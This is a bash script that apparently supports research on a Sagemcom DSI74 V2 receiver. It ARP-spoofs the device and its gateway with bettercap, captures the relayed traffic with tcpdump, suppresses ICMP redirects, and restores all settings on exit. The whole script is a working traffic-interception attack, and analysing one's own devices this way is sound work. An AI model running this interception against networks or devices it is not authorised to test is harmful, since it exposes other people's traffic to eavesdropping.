#!/usr/bin/env bash
# NET-PATH-003: Bounded relay and capture session for Sagemcom DSI74 V2
set -euo pipefail

IFACE="enp5s0"
TARGET_IP="192.168.1.134"
TARGET_MAC="68:15:90:6b:81:96"
GATEWAY_IP="192.168.1.1"
GATEWAY_MAC="14:ca:56:81:18:71"
DURATION="${1:-300}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CAPTURES_DIR="${REPO_DIR}/captures"
mkdir -p "${CAPTURES_DIR}"

PCAP_FILE="${CAPTURES_DIR}/net-path-003.pcap"
LOG_FILE="${CAPTURES_DIR}/net-path-003.log"
BETTERCAP_LOG="${CAPTURES_DIR}/bettercap.log"

ORIG_REDIRECT_ALL="$(sysctl -n net.ipv4.conf.all.send_redirects)"
ORIG_REDIRECT_IF="$(sysctl -n net.ipv4.conf.${IFACE}.send_redirects)"
ORIG_IP_FORWARD="$(sysctl -n net.ipv4.ip_forward)"

echo "[+] Target: ${TARGET_IP} (${TARGET_MAC})"
echo "[+] Gateway: ${GATEWAY_IP} (${GATEWAY_MAC})"
echo "[+] Interface: ${IFACE}"
echo "[+] Capture target: ${PCAP_FILE}"
echo "[+] Original sysctl: ip_forward=${ORIG_IP_FORWARD}, send_redirects(all=${ORIG_REDIRECT_ALL}, ${IFACE}=${ORIG_REDIRECT_IF})"

CLEANED_UP=0
cleanup() {
    if [ "$CLEANED_UP" -eq 1 ]; then
        return
    fi
    CLEANED_UP=1
    echo "[*] Cleaning up session..."

    if [ -n "${BETTERCAP_PID:-}" ] && kill -0 "${BETTERCAP_PID}" 2>/dev/null; then
        echo "[*] Terminating bettercap (allowing ARP restore)..."
        kill -INT "${BETTERCAP_PID}" 2>/dev/null || true
        # Wait up to 3 seconds for bettercap to restore ARP
        for _ in 1 2 3; do
            if ! kill -0 "${BETTERCAP_PID}" 2>/dev/null; then
                break
            fi
            sleep 1
        done
        kill -9 "${BETTERCAP_PID}" 2>/dev/null || true
    fi

    if [ -n "${TCPDUMP_PID:-}" ] && kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
        echo "[*] Terminating tcpdump..."
        kill -TERM "${TCPDUMP_PID}" 2>/dev/null || true
        wait "${TCPDUMP_PID}" 2>/dev/null || true
    fi

    echo "[*] Removing temporary iptables rules..."
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -s "${TARGET_IP}" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -d "${TARGET_IP}" -j ACCEPT 2>/dev/null || true

    echo "[*] Restoring sysctl redirect settings..."
    sysctl -w "net.ipv4.conf.all.send_redirects=${ORIG_REDIRECT_ALL}" >/dev/null
    sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=${ORIG_REDIRECT_IF}" >/dev/null

    echo "[+] Cleanup complete. Current forward rules:"
    iptables -S FORWARD
}

trap cleanup EXIT INT TERM

echo "[+] Applying sysctl redirect suppression..."
sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=0" >/dev/null

echo "[+] Inserting targeted iptables rules..."
iptables -I FORWARD 1 -i "${IFACE}" -o "${IFACE}" -s "${TARGET_IP}" -j ACCEPT
iptables -I FORWARD 2 -i "${IFACE}" -o "${IFACE}" -d "${TARGET_IP}" -j ACCEPT

echo "[+] Starting tcpdump..."
tcpdump -i "${IFACE}" -s 0 -nn -U -w "${PCAP_FILE}" \
    "host ${TARGET_IP} or ether host ${TARGET_MAC}" >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1

if ! kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
    echo "[-] Error: tcpdump failed to start"
    exit 1
fi
echo "[+] tcpdump started (PID ${TCPDUMP_PID})"

echo "[+] Starting bettercap ARP redirection..."
bettercap -iface "${IFACE}" -gateway-override "${GATEWAY_IP}" -silent \
    -eval "set arp.spoof.targets ${TARGET_IP}; set arp.spoof.fullduplex true; set arp.spoof.internal false; set arp.spoof.skip_restore false; arp.spoof on" \
    > "${BETTERCAP_LOG}" 2>&1 &
BETTERCAP_PID=$!
sleep 2

if ! kill -0 "${BETTERCAP_PID}" 2>/dev/null; then
    echo "[-] Error: bettercap failed to start. Logs:"
    cat "${BETTERCAP_LOG}"
    exit 1
fi
echo "[+] bettercap started (PID ${BETTERCAP_PID})"
echo "[+] Relay is ACTIVE. Bounded duration: ${DURATION} seconds."
echo "[+] Ready for receiver diagnostic execution."

# Wait for specified duration or until interrupted
sleep "${DURATION}"
echo "[+] Bounded duration reached."
